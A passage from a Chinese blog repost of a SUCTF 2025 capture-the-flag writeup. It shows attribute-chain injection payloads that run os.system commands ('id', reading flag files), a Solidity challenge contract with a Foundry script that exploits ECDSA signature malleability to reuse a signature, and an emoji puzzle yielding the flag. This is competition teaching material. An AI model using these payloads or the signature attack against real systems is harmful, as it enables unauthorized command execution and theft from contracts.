os;os.system(&#x27;id&#x27;)&quot;&#125;</span><br><span class="line">&#123;&quot;key&quot;: &quot;.__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]&quot;,&quot;value&quot;: &quot;*;import os;os.system(&#x27;/read* &gt;/tmp/gaoren.txt&#x27;)&quot;&#125;</span><br><span class="line">data=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28]</span><br><span class="line">for i in range(len(data)):</span><br><span class="line">    print(chr(data[i]+i),end=&#x27;&#x27;)</span><br><span class="line">#AndPWNT00</span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.28;</span><br><span class="line"></span><br><span class="line">contract MagicBox &#123;</span><br><span class="line"> struct Signature &#123;</span><br><span class="line"> uint8 v;</span><br><span class="line"> bytes32 r;</span><br><span class="line"> bytes32 s;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> address magician;</span><br><span class="line"> bytes32 alreadyUsedSignatureHash;</span><br><span class="line"> bool isOpened;</span><br><span class="line"></span><br><span class="line"> constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line"> function isSolved() public view returns (bool) &#123;</span><br><span class="line"> return isOpened;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function getMessageHash(address _magician) public view returns (bytes32) &#123;</span><br><span class="line"> return keccak256(abi.encodePacked(&quot;I want to open the magic box&quot;, _magician, address(this), block.chainid));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) &#123;</span><br><span class="line"> address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);</span><br><span class="line"> bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));</span><br><span class="line"> return (signer, signatureHash);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function signIn(Signature memory signature) external &#123;</span><br><span class="line"> require(magician == address(0), &quot;Magician already signed in&quot;);</span><br><span class="line"> (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);</span><br><span class="line"> require(signer == msg.sender, &quot;Invalid signature&quot;);</span><br><span class="line"> magician = signer;</span><br><span class="line"> alreadyUsedSignatureHash = signatureHash;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function openBox(Signature memory signature) external &#123;</span><br><span class="line"> require(magician == msg.sender, &quot;Only magician can open the box&quot;);</span><br><span class="line"> (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);</span><br><span class="line"> require(signer == msg.sender, &quot;Invalid signature&quot;);</span><br><span class="line"> require(signatureHash != alreadyUsedSignatureHash, &quot;Signature already used&quot;);</span><br><span class="line"> isOpened = true;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">import &#123;Script, console2&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;MagicBox&#125; from &quot;../src/MagicBox.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack is Script &#123;</span><br><span class="line"> function run() external &#123;</span><br><span class="line"> MagicBox target = MagicBox(vm.envAddress(&quot;target&quot;));</span><br><span class="line"> // secp256k1 曲线的阶 n</span><br><span class="line"> uint256 n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);</span><br><span class="line"></span><br><span class="line"> vm.startBroadcast();</span><br><span class="line"> bytes32 MessageHash = target.getMessageHash(vm.envAddress(&quot;account&quot;));</span><br><span class="line"> vm.stopBroadcast();</span><br><span class="line"></span><br><span class="line"> (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.envUint(&quot;key&quot;), MessageHash);</span><br><span class="line"> v = 28;</span><br><span class="line"> MagicBox.Signature memory signature1 = MagicBox.Signature(v, r, s);</span><br><span class="line"></span><br><span class="line"> MagicBox.Signature memory signature2 = MagicBox.Signature(27, r, bytes32(n - uint256(s)));</span><br><span class="line"></span><br><span class="line"> vm.startBroadcast();</span><br><span class="line"> target.signIn(signature1);</span><br><span class="line"> target.openBox(signature2);</span><br><span class="line"> vm.stopBroadcast();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">🐍☂️🐈🌮🍟分别对应以下：</span><br><span class="line">snake</span><br><span class="line">umbrellla</span><br><span class="line">cat</span><br><span class="line">taco</span><br><span class="line">fries</span><br><span class="line">取第一个字符得到suctf，依次类推得到：</span><br><span class="line">suctf&#123;welcome_to_suctf_you_can_really_dance&#125;</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/223976.html](https://www.ctfiot.com/223976.html)
+> 仓库原文：[CTF大赛WP集合/articles/SUCTF_2025_writeup_by_Min-Venom.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/SUCTF_2025_writeup_by_Min-Venom.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/cakephp-5-1-4/">cakephp-5.1.4</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/01/01/ctf-kb/wp/Web/RCTF2025-WP/" title="RCTF 2025 WP - XMCVE-Polaris 战队第 16 名"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">RCTF 2025 WP - XMCVE-Polaris 战队第 16 名</div></div></a></div><div class="next-post pull-right"><a href="/2025/01/01/ctf-kb/wp/Web/TCH-%E8%85%BE%E8%AE%AF%E4%BA%91%E9%BB%91%E5%AE%A2%E6%9D%BE_%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%99%BA%E8%83%BD%E6%B8%97%E9%80%8F%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="[TCH] 腾讯云黑客松 第二届智能渗透挑战赛复盘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[TCH] 腾讯云黑客松 第二届智能渗透挑战赛复盘</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
